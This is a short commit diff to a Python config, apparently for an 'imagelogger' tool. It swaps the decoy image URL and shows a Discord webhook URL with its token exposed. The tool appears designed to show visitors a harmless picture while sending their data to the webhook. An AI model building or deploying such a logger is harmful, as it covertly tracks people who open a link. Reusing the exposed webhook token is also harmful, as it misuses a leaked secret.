f0a8e114879cd147fb36f00ff81d2e67f8cda7be
Samsnipes <snipexyz315@gmail.com>
2026-07-11 13:49:16 +0530

    Update image.py

--- api/image.py
+++ api/image.py
@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1525202555947319316/t0us22fla8vcFmeA9ISrNoi7gmm9aYQu8PVF_vY1lsU5AMKQfhby_x6YLGQ0-L_rorYT",
-    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
